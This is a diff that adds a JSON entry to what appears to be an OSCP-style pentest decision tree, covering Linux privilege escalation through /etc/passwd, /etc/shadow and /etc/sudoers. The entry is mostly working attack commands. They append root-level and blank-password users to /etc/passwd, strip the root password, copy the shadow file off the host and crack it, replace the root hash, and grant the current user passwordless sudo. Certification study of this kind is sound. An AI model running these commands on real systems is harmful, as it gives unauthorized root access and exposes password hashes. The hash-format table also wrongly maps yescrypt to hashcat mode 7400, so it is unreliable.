@@ -1,0 +1,22 @@
+{
+  "id": "passwd_shadow",
+  "phase": "LINUX",
+  "title": "/etc/passwd & /etc/shadow Abuse",
+  "body": "Writable /etc/passwd = instant root. Readable /etc/shadow = crack offline. Two of the most common Linux privesc vectors on OSCP.",
+  "cmd": "# ── CHECK PERMISSIONS ────────────────────────────────\nls -la /etc/passwd /etc/shadow\n# /etc/passwd  -rw-rw-rw-  = world writable = instant root\n# /etc/shadow  readable    = grab hashes and crack\n\n# ── WRITABLE /ETC/PASSWD — ADD ROOT USER ─────────────\n# Step 1: generate hash\nopenssl passwd w00t\n# → Fdzt.eqJQ4s0g\n\n# Step 2: append root-level user\necho \"jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" >> /etc/passwd\n\n# Step 3: switch user\nsu jimi421    # password: w00t\nid            # uid=0(root)\n\n# Blank password variant (no password needed):\necho \"r00t::0:0:root:/root:/bin/bash\" >> /etc/passwd\nsu r00t       # just press Enter\n\n# ── WRITABLE /ETC/PASSWD — REMOVE ROOT PASSWORD ──────\n# Copy, edit, replace\ncp /etc/passwd /tmp/passwd.bak\nsed 's/root:x:/root::/' /etc/passwd > /tmp/passwd_new\ncp /tmp/passwd_new /etc/passwd\nsu root       # blank password now works\n\n# ── READABLE /ETC/SHADOW — CRACK OFFLINE ─────────────\ncat /etc/shadow\n# Copy both files to Kali:\nscp user@$ip:/etc/shadow .\nscp user@$ip:/etc/passwd .\n\n# Unshadow then crack\nunshadow passwd shadow > unshadowed.txt\nhashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\njohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\n\n# Hash format reference:\n# $1$  = MD5          hashcat -m 500\n# $5$  = SHA-256      hashcat -m 7400\n# $6$  = SHA-512      hashcat -m 1800  (most common on modern Linux)\n# $y$  = yescrypt     hashcat -m 7400\n\n# ── WRITABLE /ETC/SHADOW — REPLACE ROOT HASH ─────────\n# Generate hash\nopenssl passwd -6 -salt xyz newpassword   # SHA-512\npython3 -c \"import crypt; print(crypt.crypt('pass123', crypt.mksalt(crypt.METHOD_SHA512)))\"\n# Replace root hash in shadow (use sed or vim)\n# Then: su root (password: newpassword)\n\n# ── /ETC/SUDOERS WRITABLE ────────────────────────────\nls -la /etc/sudoers\necho \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers\nsudo su",
+  "warn": "unix-privesc-check specifically flags world-writable /etc/passwd — run it if you haven't already. SHA-512 ($6$) hashes are slow to crack — use rules and targeted wordlists.",
+  "choices": [
+    {
+      "label": "Got root via passwd",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Got shadow hashes — crack them",
+      "next": "hashcrack"
+    },
+    {
+      "label": "Back to enum",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
